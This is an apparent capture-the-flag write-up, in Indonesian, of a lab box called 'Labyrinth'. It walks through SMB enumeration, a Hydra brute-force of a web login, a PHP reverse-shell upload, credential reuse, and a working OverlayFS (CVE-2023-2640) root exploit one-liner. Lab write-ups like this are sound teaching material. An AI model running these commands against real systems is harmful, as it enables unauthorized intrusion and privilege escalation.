**Target IP :** 10.1.2.130 **Difficulty :** Hard **OS :** Linux (Ubuntu 20.04, kernel 5.4.0-70-generic)

---

## 1. Ringkasan (Summary)

Box **Labyrinth** diselesaikan melalui rangkaian tahapan berikut:

1. Enumerasi jaringan & SMB untuk mengumpulkan username.
2. Menemukan credential hint dari file note di share SMB.
3. Brute-force form login web menggunakan Hydra.
4. Login ke panel admin dan mengeksploitasi fitur upload file untuk mendapatkan **RCE** sebagai `www-data`.
5. Menemukan credential CouchDB yang di-_reuse_ untuk privilege escalation ke user **azuki**.
6. Eksploitasi kerentanan kernel OverlayFS (**GameOver(lay)** — CVE-2023-2640) untuk mendapatkan **root**.

## 2. Reconnaissance

### 2.1 Port Scanning

```
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
```

### 2.2 Web Content Discovery

```bash
feroxbuster -u http://10.1.2.130/ \
  -w /home/greed/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 100 --filter-status 404,400 -k --dont-filter -x html,php,txt --redirects
```

Hasil penting:

|Status|Path|
|---|---|
|200|`/`|
|200|`/index.php`|
|200|`/logout.php`|
|403|`/uploads/`|
### 2.3 SMB Enumeration

Temuan kritis dari enumerasi SMB:

- **Username `azuki`** ditemukan melalui RID cycling (SID `S-1-22-1-1000`) — merupakan local Unix user.
- **Share `Data`** dapat diakses tanpa autentikasi (mapping: OK, listing: OK).
- **Null session** diizinkan oleh server (login dengan username/password kosong berhasil).
- **Password policy lemah**: complexity _disabled_, minimum length hanya 5 karakter — indikasi rentan terhadap brute-force.

### 2.4 Note File dari SMB Share

Ditemukan file `note_to_admin.txt` pada share `Data`:

```
Ms. Sky (sodachan),
Please remind me later to buy all the glowsticks for the local event 
we're going to have later this weekend in case I forgot.
Buy one from each color.
Thanks
- John Doe (administr8)
```

**Analisis:**

|Petunjuk|Interpretasi|
|---|---|
|"Ms. Sky"|Alias untuk username `sodachan`|
|"John Doe"|Alias untuk username `administr8`|
|"buy all the glowsticks... one from each color"|Kemungkinan hint terkait password|

Username yang berhasil dikumpulkan pada tahap ini: `azuki`, `sodachan`, `administr8`.

## 3. Initial Access

### 3.1 Brute-force Login Form

Form login pada `/login.php` di-brute-force menggunakan Hydra dengan username `administr8`:


```bash
hydra -l administr8 -P /home/greed/rockyou.txt \
  10.1.2.130 http-post-form \
  "/login.php:username=^USER^&password=^PASS^&login=:F=Wrong username or password" \
  -V
```

**Hasil:**

```
[80][http-post-form] host: 10.1.2.130   login: administr8   password: jellybean
1 of 1 target successfully completed, 1 valid password found
```

Login berhasil dan mengarahkan ke halaman **`/c0ntr01p4n31.php`**, sebuah panel dengan fitur upload file:

```html
<form enctype="multipart/form-data" action="c0ntr01p4n31.php" method="POST">
  <p>Upload your file</p>
  <input type="file" name="uploaded_file">
  <input type="submit" value="Upload">
</form>
```

### 3.2 Fuzzing Struktur Direktori Upload

Untuk menemukan lokasi penyimpanan file hasil upload, dilakukan fuzzing bertahap terhadap pola direktori berbasis tanggal:

```bash
feroxbuster -u http://10.1.2.130/uploads/2026/ \
  -w /home/greed/SecLists/Discovery/Web-Content/raft-medium-words.txt \
  -t 100 --filter-status 404,400,403 -k --dont-filter -x php --redirects
```

Struktur direktori yang ditemukan mengikuti pola:

```
/uploads/{tahun}/{bulan}/{tanggal}/{username}/
```

Contoh path valid yang ditemukan:

```
http://10.1.2.130/uploads/2026/07/09/administr8/
http://10.1.2.130/uploads/2026/07/08/administr8/
```

### 3.3 Verifikasi Arbitrary File Upload

File test (`greed.txt`) diunggah melalui form upload dan berhasil diakses pada path:

```
http://10.1.2.130/uploads/2026/07/09/administr8/greed.txt
```

Ini mengonfirmasi bahwa mekanisme upload **tidak menerapkan validasi ekstensi**, sehingga file `.php` juga akan diterima dan dieksekusi oleh server.
### 3.4 Remote Code Execution

Web shell berbasis payload **pentestmonkey PHP reverse shell** diunggah melalui form upload, kemudian diakses langsung untuk memicu koneksi balik (reverse shell) ke listener:

```bash
nc -lvnp 4444
```

Setelah file diakses, koneksi reverse shell berhasil diterima dengan konteks user:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## 4. Privilege Escalation: www-data → azuki

### 4.1 Penemuan Credential CouchDB

Melalui eksplorasi filesystem, ditemukan file konfigurasi CouchDB yang menyimpan credential admin dalam bentuk plaintext:

**Path:** `/opt/couchdb/etc/local.ini`

```ini
[admins]
admin = 'sofa kuning'
```

### 4.2 Password Reuse

Credential `admin:sofa kuning` yang semula digunakan untuk autentikasi CouchDB ternyata di-_reuse_ sebagai password sistem untuk user lokal `azuki`:

```bash
su azuki
# Password: sofa kuning
```

Login berhasil, dan flag user pertama ditemukan:

```
$ cat /home/azuki/user.txt
d50f7b**************
```

### 4.3 Enumerasi Lanjutan sebagai azuki

Dilakukan enumerasi menyeluruh sebagai user `azuki` untuk mencari jalur eskalasi ke root, meliputi:

- Pengecekan `sudo -l`, SUID/SGID binaries, capabilities, cron jobs, dan systemd timers — seluruhnya merupakan konfigurasi standar Ubuntu tanpa temuan yang dapat dieksploitasi.
- Keanggotaan grup: `azuki` merupakan anggota grup kustom **`manager`** (GID 1001), sementara `root` merupakan anggota grup **`editors`** (GID 1002) — namun tidak ditemukan file writable terkait kedua grup tersebut.
- Verifikasi versi komponen sistem:
    - `sudo 1.8.31` (berpotensi rentan CVE-2021-3156 / _Baron Samedit_, namun tidak dapat dieksploitasi karena tidak tersedia compiler C di target).
    - `snapd 2.49.1` (di atas versi rentan CVE-2019-7304 / _Dirty Sock_ — tidak applicable).
    - Grup `lxd` tidak beranggotakan `azuki`, sehingga jalur _LXD group privilege escalation_ tidak dapat digunakan.

## 5. Privilege Escalation: azuki → root

### 5.1 Kerentanan yang Digunakan

**CVE-2023-2640 / CVE-2023-32629** — dikenal dengan sebutan **"GameOver(lay)"**, merupakan kerentanan pada implementasi OverlayFS di kernel Ubuntu. Kerentanan ini memungkinkan user tanpa privilege untuk memanipulasi _extended attribute_ `security.capability` melalui mekanisme _unprivileged user namespace_ dan OverlayFS, sehingga dapat memperoleh Linux capability (`cap_setuid`) pada binary yang dikontrol sepenuhnya oleh attacker.

### 5.2 Eksploitasi

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" \
&& u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

**Penjelasan alur:**

1. Membuat _user namespace_ baru tanpa privilege khusus (`unshare -rm`).
2. Menyalin binary `python3` ke direktori lower layer OverlayFS.
3. Memberikan capability `cap_setuid` pada salinan binary tersebut menggunakan `setcap`.
4. Melakukan mount OverlayFS yang menggabungkan lower/upper/work directory.
5. Akibat kesalahan validasi capability pada implementasi OverlayFS Ubuntu, binary hasil mount overlay mewarisi capability `cap_setuid` meskipun dijalankan oleh user tanpa privilege.
6. Binary `python3` yang telah memiliki capability tersebut dieksekusi untuk memanggil `setuid(0)`, kemudian men-spawn shell dengan privilege root.

### 5.3 Hasil

```
root@labyrinth:/tmp# id
uid=0(root) gid=0(root)

root@labyrinth:/tmp# cat /root/root.txt
e916519bb*********
```

Akses root berhasil diperoleh, dan flag root ditemukan.

---

## 6. Ringkasan Chain Eksploitasi

|Tahap|Teknik|Hasil|
|---|---|---|
|1|SMB enumeration + null session|Username `azuki`, `sodachan`, `administr8`|
|2|Note file di SMB share|Password hint|
|3|Hydra brute-force pada `/login.php`|Credential `administr8:jellybean`|
|4|Arbitrary file upload di `c0ntr01p4n31.php`|RCE sebagai `www-data`|
|5|Credential CouchDB (`local.ini`) + password reuse|Privesc ke user `azuki`|
|6|CVE-2023-2640 (GameOver(lay), OverlayFS)|Privesc ke `root`|